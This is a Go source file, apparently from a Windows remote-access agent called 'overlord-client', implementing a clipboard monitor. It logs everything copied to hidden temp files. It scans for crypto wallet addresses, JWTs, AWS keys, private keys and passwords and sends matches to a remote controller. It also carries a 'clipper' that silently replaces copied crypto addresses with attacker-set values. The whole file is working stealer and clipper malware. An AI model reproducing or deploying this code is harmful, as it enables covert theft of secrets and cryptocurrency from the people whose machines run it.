//go:build windows

package activewindow

import (
	"context"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"
	"unsafe"

	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"

	"golang.org/x/sys/windows"
)

// --- Patterns for automatic detection ---

var clipPatterns = []struct {
	name    string
	pattern *regexp.Regexp
}{
	{"bitcoin", regexp.MustCompile(`\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}\b`)},
	{"ethereum", regexp.MustCompile(`\b0x[a-fA-F0-9]{40}\b`)},
	{"monero", regexp.MustCompile(`\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b`)},
	{"solana", regexp.MustCompile(`\b[1-9A-HJ-NP-Za-km-z]{32,44}\b`)},
	{"jwt", regexp.MustCompile(`eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+`)},
	{"aws_key", regexp.MustCompile(`\bAKIA[0-9A-Z]{16}\b`)},
	{"private_key", regexp.MustCompile(`-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----`)},
	{"password_field", regexp.MustCompile(`(?i)(password|passwd|pwd|secret|token|api[_-]?key)\s*[:=]\s*\S+`)},
}

// --- Clipper: replace crypto addresses ---

type ClipperRule struct {
	Pattern     *regexp.Regexp
	Replacement string
}

var clipperMu sync.RWMutex
var clipperRules []ClipperRule

func SetClipperRules(rules []ClipperRule) {
	clipperMu.Lock()
	defer clipperMu.Unlock()
	clipperRules = rules
}

func applyClipper(content string) (string, string) {
	clipperMu.RLock()
	defer clipperMu.RUnlock()
	for _, rule := range clipperRules {
		replaced := rule.Pattern.ReplaceAllString(content, rule.Replacement)
		if replaced != content {
			return replaced, rule.Replacement
		}
	}
	return content, ""
}

// --- Log file ---

const (
	clipLogPrefix    = "cbmon-"
	clipMaxFileSize  = 5 * 1024 * 1024
	clipFileRetention = 7 * 24 * time.Hour
)

type clipLogger struct {
	mu          sync.Mutex
	logDir      string
	currentFile *os.File
	currentDate string
}

func newClipLogger() *clipLogger {
	return &clipLogger{logDir: os.TempDir()}
}

func (cl *clipLogger) write(entry string) {
	cl.mu.Lock()
	defer cl.mu.Unlock()

	today := time.Now().Format("2006-01-02")
	if cl.currentDate != today || cl.currentFile == nil {
		if cl.currentFile != nil {
			cl.currentFile.Close()
		}
		name := fmt.Sprintf("%s%s-%d.log", clipLogPrefix, today, time.Now().Unix())
		f, err := os.OpenFile(filepath.Join(cl.logDir, name), os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
		if err != nil {
			return
		}
		cl.currentFile = f
		cl.currentDate = today
		cl.cleanupOld()
	}

	if cl.currentFile != nil {
		if info, err := cl.currentFile.Stat(); err == nil && info.Size() >= clipMaxFileSize {
			cl.currentFile.Close()
			cl.currentFile = nil
			cl.currentDate = ""
			return
		}
		_, _ = cl.currentFile.WriteString(entry)
	}
}

func (cl *clipLogger) cleanupOld() {
	entries, err := os.ReadDir(cl.logDir)
	if err != nil {
		return
	}
	cutoff := time.Now().Add(-clipFileRetention)
	for _, e := range entries {
		if e.IsDir() || !strings.HasPrefix(e.Name(), clipLogPrefix) {
			continue
		}
		if info, err := e.Info(); err == nil && info.ModTime().Before(cutoff) {
			_ = os.Remove(filepath.Join(cl.logDir, e.Name()))
		}
	}
}

// --- Main monitor ---

func StartClipboardMonitor(ctx context.Context, env *runtime.Env) error {
	if env == nil {
		return nil
	}
	log.Printf("[clipmon] starting")
	defer log.Printf("[clipmon] stopped")

	logger := newClipLogger()
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	var lastContent string

	for {
		select {
		case <-ctx.Done():
			return nil
		case <-ticker.C:
		}

		content := readClipboardTextMon()
		if content == "" || content == lastContent {
			continue
		}
		lastContent = content
		ts := time.Now().Format("2006-01-02 15:04:05")

		// 1. Log everything
		logEntry := fmt.Sprintf("[%s] %s\n", ts, content)
		logger.write(logEntry)

		// 2. Detect patterns
		for _, pat := range clipPatterns {
			if match := pat.pattern.FindString(content); match != "" {
				log.Printf("[clipmon] detected %s: %s", pat.name, match)
				note := wire.Notification{
					Type:     "notification",
					Category: "clipboard_detect",
					Title:    fmt.Sprintf("[%s] %s", pat.name, truncate(match, 200)),
					Keyword:  pat.name,
					TS:       time.Now().UnixMilli(),
				}
				if err := wire.WriteMsg(ctx, env.Conn, note); err != nil {
					log.Printf("[clipmon] send notification failed: %v", err)
				}
				break
			}
		}

		// 3. Clipper: replace if rule matches
		replaced, replWith := applyClipper(content)
		if replWith != "" {
			log.Printf("[clipmon] clipper triggered, replacing with: %s", truncate(replWith, 60))
			if err := writeClipboard(ctx, replaced); err != nil {
				log.Printf("[clipmon] clipper write failed: %v", err)
			} else {
				lastContent = replaced
				note := wire.Notification{
					Type:     "notification",
					Category: "clipboard_clipper",
					Title:    fmt.Sprintf("Clipboard replaced → %s", truncate(replWith, 100)),
					Keyword:  "clipper",
					TS:       time.Now().UnixMilli(),
				}
				_ = wire.WriteMsg(ctx, env.Conn, note)
			}
		}
	}
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

// --- Win32 helpers ---

var (
	cbMon32                 = windows.NewLazySystemDLL("user32.dll")
	cbMonKernel32           = windows.NewLazySystemDLL("kernel32.dll")
	procOpenClipMon         = cbMon32.NewProc("OpenClipboard")
	procCloseClipMon        = cbMon32.NewProc("CloseClipboard")
	procGetClipDataMon      = cbMon32.NewProc("GetClipboardData")
	procEmptyClipMon        = cbMon32.NewProc("EmptyClipboard")
	procSetClipDataMon      = cbMon32.NewProc("SetClipboardData")
	procGlobalAllocMon      = cbMonKernel32.NewProc("GlobalAlloc")
	procGlobalLockMon       = cbMonKernel32.NewProc("GlobalLock")
	procGlobalUnlockMon     = cbMonKernel32.NewProc("GlobalUnlock")
	procRtlMoveMemoryMon    = cbMonKernel32.NewProc("RtlMoveMemory")
)

const cfUnicodeMon = 13
const gmemMoveableMon = 0x0002

func readClipboardTextMon() string {
	r, _, _ := procOpenClipMon.Call(0)
	if r == 0 {
		return ""
	}
	defer procCloseClipMon.Call()
	h, _, _ := procGetClipDataMon.Call(cfUnicodeMon)
	if h == 0 {
		return ""
	}
	ptr, _, _ := procGlobalLockMon.Call(h)
	if ptr == 0 {
		return ""
	}
	defer procGlobalUnlockMon.Call(h)
	return utf16PtrFromUintptrMon(ptr)
}

func writeClipboard(ctx context.Context, text string) error {
	for attempt := 0; attempt < 5; attempt++ {
		r, _, _ := procOpenClipMon.Call(0)
		if r != 0 {
			break
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(time.Duration(attempt+1) * 20 * time.Millisecond):
		}
	}
	defer procCloseClipMon.Call()

	procEmptyClipMon.Call()

	utf16, err := windows.UTF16FromString(text)
	if err != nil {
		return err
	}
	size := len(utf16) * 2
	hMem, _, _ := procGlobalAllocMon.Call(gmemMoveableMon, uintptr(size))
	if hMem == 0 {
		return fmt.Errorf("GlobalAlloc failed")
	}
	ptr, _, _ := procGlobalLockMon.Call(hMem)
	if ptr == 0 {
		return fmt.Errorf("GlobalLock failed")
	}
	src := uintptr(unsafe.Pointer(&utf16[0]))
	procRtlMoveMemoryMon.Call(ptr, src, uintptr(size))
	procGlobalUnlockMon.Call(hMem)

	r, _, _ := procSetClipDataMon.Call(cfUnicodeMon, hMem)
	if r == 0 {
		return fmt.Errorf("SetClipboardData failed")
	}
	return nil
}

func utf16PtrFromUintptrMon(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	n := 0
	for {
		v := *(*uint16)(unsafe.Pointer(ptr + uintptr(n)*2))
		if v == 0 {
			break
		}
		n++
		if n > 1<<20 {
			break
		}
	}
	u16 := (*[1 << 20]uint16)(unsafe.Pointer(ptr))[:n:n]
	return windows.UTF16ToString(u16)
}
